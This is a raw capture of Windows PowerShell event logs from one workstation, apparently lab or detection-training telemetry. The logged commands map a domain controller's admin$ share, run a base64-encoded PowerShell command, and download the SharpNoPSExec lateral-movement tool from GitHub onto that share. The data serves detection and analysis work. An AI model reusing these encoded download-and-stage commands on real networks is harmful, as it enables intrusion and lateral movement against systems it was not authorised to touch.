<15>Jul  8 13:42:36 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4105,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":102,"OpcodeValue":15,"RecordNumber":9592,"ActivityID":"{66883D06-FD3B-0000-6C70-28DDCE92D801}","ProcessID":2744,"ThreadID":6748,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Started invocation of ScriptBlock ID: 8a2eb722-a6bf-4512-98af-f9a915666329\r\nRunspace ID: 401d1dde-7f2f-461c-ac0f-7d2718b0c594","Category":"Starting Command","Opcode":"On create calls","ScriptBlockId":"8a2eb722-a6bf-4512-98af-f9a915666329","RunspaceId":"401d1dde-7f2f-461c-ac0f-7d2718b0c594","EventReceivedTime":1657287756,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4328,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"out-lineoutput\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=64\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=9\r\n\tCommandName=out-lineoutput\r\n\tCommandType=Cmdlet\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4330,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"PSConsoleHostReadLine\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=66\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=10\r\n\tCommandName=PSConsoleHostReadLine\r\n\tCommandType=Function\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4332,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"Set-StrictMode\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=68\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=10\r\n\tCommandName=Set-StrictMode\r\n\tCommandType=Cmdlet\r\n\tScriptName=C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\r\n\tCommandPath=\r\n\tCommandLine=    Microsoft.PowerShell.Core\\Set-StrictMode -Off\n","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:36 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4105,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":102,"OpcodeValue":15,"RecordNumber":9589,"ActivityID":"{66883D06-FD3B-0000-2F70-28DDCE92D801}","ProcessID":2744,"ThreadID":6892,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Started invocation of ScriptBlock ID: 0894491b-bd2d-41d4-96d0-62772118a110\r\nRunspace ID: 401d1dde-7f2f-461c-ac0f-7d2718b0c594","Category":"Starting Command","Opcode":"On create calls","ScriptBlockId":"0894491b-bd2d-41d4-96d0-62772118a110","RunspaceId":"401d1dde-7f2f-461c-ac0f-7d2718b0c594","EventReceivedTime":1657287756,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:36 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4106,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":103,"OpcodeValue":15,"RecordNumber":9595,"ActivityID":"{66883D06-FD3B-0000-6D70-28DDCE92D801}","ProcessID":2744,"ThreadID":6748,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Completed invocation of ScriptBlock ID: 8a2eb722-a6bf-4512-98af-f9a915666329\r\nRunspace ID: 401d1dde-7f2f-461c-ac0f-7d2718b0c594","Category":"Stopping Command","Opcode":"On create calls","ScriptBlockId":"8a2eb722-a6bf-4512-98af-f9a915666329","RunspaceId":"401d1dde-7f2f-461c-ac0f-7d2718b0c594","EventReceivedTime":1657287756,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":501,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4316,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"net.exe\" is Stopped. \r\n\r\nDetails: \r\n\tNewCommandState=Stopped\r\n\r\n\tSequenceNumber=51\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=8\r\n\tCommandName=net.exe\r\n\tCommandType=Application\r\n\tScriptName=\r\n\tCommandPath=C:\\Windows\\system32\\net.exe\r\n\tCommandLine=net use g: \\\\activedir.stackedpads.local\\admin$","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:35 wrk-shasek.stackedpads.local PowerShell[0]: {"EventTime":1657287754,"Hostname":"wrk-shasek.stackedpads.local","Keywords":36028797018963968,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":500,"SourceName":"PowerShell","Version":0,"Task":5,"OpcodeValue":0,"RecordNumber":4320,"ProcessID":0,"ThreadID":0,"Channel":"Windows PowerShell","Message":"Command \"\" is Started. \r\n\r\nDetails: \r\n\tNewCommandState=Started\r\n\r\n\tSequenceNumber=56\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.1682\r\n\tHostId=42cdcba1-e8f1-4dd2-bc44-3932b9df9eed\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\n\tEngineVersion=5.1.19041.1682\r\n\tRunspaceId=401d1dde-7f2f-461c-ac0f-7d2718b0c594\r\n\tPipelineId=9\r\n\tCommandName=\r\n\tCommandType=Script\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Category":"Command Lifecycle","Opcode":"Info","EventReceivedTime":1657287755,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4104,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":2,"OpcodeValue":15,"RecordNumber":9624,"ActivityID":"{66883D06-FD3B-0001-2D6C-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Creating Scriptblock text (1 of 1):\r\nInvoke-WebRequest -uri 'https://github.com/juliourena/SharpNoPSExec/archive/refs/heads/master.zip' -outfile 'g:\\archive.zip'\r\n\r\nScriptBlock ID: 2a6409ed-1956-4505-83bc-65bd79d7f739\r\nPath: ","Category":"Execute a Remote Command","Opcode":"On create calls","MessageNumber":"1","MessageTotal":"1","ScriptBlockText":"Invoke-WebRequest -uri 'https://github.com/juliourena/SharpNoPSExec/archive/refs/heads/master.zip' -outfile 'g:\\archive.zip'","ScriptBlockId":"2a6409ed-1956-4505-83bc-65bd79d7f739","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4104,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":2,"OpcodeValue":15,"RecordNumber":9607,"ActivityID":"{66883D06-FD3B-0001-276C-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Creating Scriptblock text (1 of 1):\r\nGet-Item \"hklm:\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit\" \r\n$LogCommandHealthEvent = $true \r\n$LogCommandLifecycleEvent = $true \r\n\r\n\r\nScriptBlock ID: 9e87d9b3-f32a-40e1-947f-fa83963071c2\r\nPath: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1","Category":"Execute a Remote Command","Opcode":"On create calls","MessageNumber":"1","MessageTotal":"1","ScriptBlockText":"Get-Item \"hklm:\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit\" \r\n$LogCommandHealthEvent = $true \r\n$LogCommandLifecycleEvent = $true \r\n","ScriptBlockId":"9e87d9b3-f32a-40e1-947f-fa83963071c2","Path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[2744]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4104,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":2,"OpcodeValue":15,"RecordNumber":9600,"ActivityID":"{66883D06-FD3B-0001-226C-28DDCE92D801}","ProcessID":2744,"ThreadID":6748,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Creating Scriptblock text (1 of 1):\r\npowershell -en  SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n\r\nScriptBlock ID: 1642b537-9bee-41a5-8577-c2c65a511c4f\r\nPath: ","Category":"Execute a Remote Command","Opcode":"On create calls","MessageNumber":"1","MessageTotal":"1","ScriptBlockText":"powershell -en  SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=","ScriptBlockId":"1642b537-9bee-41a5-8577-c2c65a511c4f","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<15>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"VERBOSE","SeverityValue":1,"Severity":"DEBUG","EventID":4104,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":2,"OpcodeValue":15,"RecordNumber":9605,"ActivityID":"{66883D06-FD3B-0000-8D70-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"Creating Scriptblock text (1 of 1):\r\n. 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1'\r\n\r\nScriptBlock ID: fa317e03-8852-4861-ad13-a6b6cf15b53d\r\nPath: ","Category":"Execute a Remote Command","Opcode":"On create calls","MessageNumber":"1","MessageTotal":"1","ScriptBlockText":". 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\profile.ps1'","ScriptBlockId":"fa317e03-8852-4861-ad13-a6b6cf15b53d","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
<14>Jul  8 13:42:43 wrk-shasek.stackedpads.local Microsoft-Windows-PowerShell[5148]: {"EventTime":1657287762,"Hostname":"wrk-shasek.stackedpads.local","Keywords":0,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":4103,"SourceName":"Microsoft-Windows-PowerShell","ProviderGuid":"{A0C1853B-5C40-4B15-8766-3CF1C58F985A}","Version":1,"Task":106,"OpcodeValue":20,"RecordNumber":9618,"ActivityID":"{66883D06-FD3B-0000-9470-28DDCE92D801}","ProcessID":5148,"ThreadID":6712,"Channel":"Microsoft-Windows-PowerShell/Operational","Domain":"STACKEDPADS","AccountName":"tim.smith","UserID":"S-1-5-21-2264196694-1469429678-912427992-1107","AccountType":"User","Message":"CommandInvocation(Get-ItemProperty): \"Get-ItemProperty\"\r\nParameterBinding(Get-ItemProperty): name=\"LiteralPath\"; value=\"Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit\"\r\nCommandInvocation(Select-Object): \"Select-Object\"\r\nParameterBinding(Select-Object): name=\"ExcludeProperty\"; value=\"PSPath, PSParentPath, PSChildName, PSDrive, PsProvider\"\r\nParameterBinding(Select-Object): name=\"Property\"; value=\"*\"\r\nCommandInvocation(Format-List): \"Format-List\"\r\nCommandInvocation(Out-String): \"Out-String\"\r\nCommandInvocation(Sort-Object): \"Sort-Object\"\r\nParameterBinding(Select-Object): name=\"InputObject\"; value=\"@{ProcessCreationIncludeCmdLine_Enabled=1; PSPath=Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit; PSParentPath=Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\policies\\system; PSChildName=audit; PSProvider=Microsoft.PowerShell.Core\\Registry}\"\r\nParameterBinding(Format-List): name=\"InputObject\"; value=\"@{ProcessCreationIncludeCmdLine_Enabled=1}\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.FormatStartData\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.GroupStartData\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.FormatEntryData\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.GroupEndData\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.FormatEndData\"\r\nParameterBinding(Sort-Object): name=\"InputObject\"; value=\"\r\n\r\nProcessCreationIncludeCmdLine_Enabled : 1\r\n\r\n\r\n\r\n\"\r\n\r\n\r\nContext:\r\n        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1682\r\n        Host ID = eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n        Engine Version = 5.1.19041.1682\r\n        Runspace ID = 5f2a817b-a28d-42f5-9e5e-2bfaba03c780\r\n        Pipeline ID = 1\r\n        Command Name = Get-ItemProperty\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 16\r\n        User = STACKEDPADS\\tim.smith\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n\r\n\r\nUser Data:\r\n\r\n","Category":"Executing Pipeline","Opcode":"To be used when operation is just executing a method","ContextInfo":"        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.19041.1682\r\n        Host ID = eb572de7-b4f8-4645-9b53-3a4abc40f4b9\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -en SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHIAaQAgACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBqAHUAbABpAG8AdQByAGUAbgBhAC8AUwBoAGEAcgBwAE4AbwBQAFMARQB4AGUAYwAvAGEAcgBjAGgAaQB2AGUALwByAGUAZgBzAC8AaABlAGEAZABzAC8AbQBhAHMAdABlAHIALgB6AGkAcAAnACAALQBvAHUAdABmAGkAbABlACAAJwBnADoAXABhAHIAYwBoAGkAdgBlAC4AegBpAHAAJwA=\r\n        Engine Version = 5.1.19041.1682\r\n        Runspace ID = 5f2a817b-a28d-42f5-9e5e-2bfaba03c780\r\n        Pipeline ID = 1\r\n        Command Name = Get-ItemProperty\r\n        Command Type = Cmdlet\r\n        Script Name = \r\n        Command Path = \r\n        Sequence Number = 16\r\n        User = STACKEDPADS\\tim.smith\r\n        Connected User = \r\n        Shell ID = Microsoft.PowerShell\r\n","Payload":"CommandInvocation(Get-ItemProperty): \"Get-ItemProperty\"\r\nParameterBinding(Get-ItemProperty): name=\"LiteralPath\"; value=\"Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit\"\r\nCommandInvocation(Select-Object): \"Select-Object\"\r\nParameterBinding(Select-Object): name=\"ExcludeProperty\"; value=\"PSPath, PSParentPath, PSChildName, PSDrive, PsProvider\"\r\nParameterBinding(Select-Object): name=\"Property\"; value=\"*\"\r\nCommandInvocation(Format-List): \"Format-List\"\r\nCommandInvocation(Out-String): \"Out-String\"\r\nCommandInvocation(Sort-Object): \"Sort-Object\"\r\nParameterBinding(Select-Object): name=\"InputObject\"; value=\"@{ProcessCreationIncludeCmdLine_Enabled=1; PSPath=Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\policies\\system\\audit; PSParentPath=Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\software\\microsoft\\windows\\currentversion\\policies\\system; PSChildName=audit; PSProvider=Microsoft.PowerShell.Core\\Registry}\"\r\nParameterBinding(Format-List): name=\"InputObject\"; value=\"@{ProcessCreationIncludeCmdLine_Enabled=1}\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.FormatStartData\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.GroupStartData\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.FormatEntryData\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.GroupEndData\"\r\nParameterBinding(Out-String): name=\"InputObject\"; value=\"Microsoft.PowerShell.Commands.Internal.Format.FormatEndData\"\r\nParameterBinding(Sort-Object): name=\"InputObject\"; value=\"\r\n\r\nProcessCreationIncludeCmdLine_Enabled : 1\r\n\r\n\r\n\r\n\"\r\n","EventReceivedTime":1657287763,"SourceModuleName":"in_powershell","SourceModuleType":"im_msvistalog"}
